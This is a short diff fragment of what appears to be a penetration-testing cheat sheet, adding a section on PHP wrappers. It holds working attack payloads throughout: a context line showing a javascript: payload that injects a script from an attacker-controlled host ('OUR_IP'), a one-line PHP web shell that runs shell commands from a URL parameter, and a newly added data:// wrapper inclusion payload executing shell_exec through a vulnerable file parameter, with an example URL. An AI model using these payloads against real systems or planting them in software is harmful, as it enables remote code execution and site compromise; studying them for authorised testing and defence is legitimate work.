@@ -57,3 +57,14 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```php
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ```
+
+# PHP Wrappers
+
+### php: PHP data wrapper example:
+```
+<vuln_url>/<vuln_path>?<vuln_param>=data:text/plain,<?php echo shell_exec("whoami") ?>
+
+# e.g.: http://10.10.0.2/menu.php?file=data:text/plain,<?php echo shell_exec("whoami") ?>
+```
+---
+
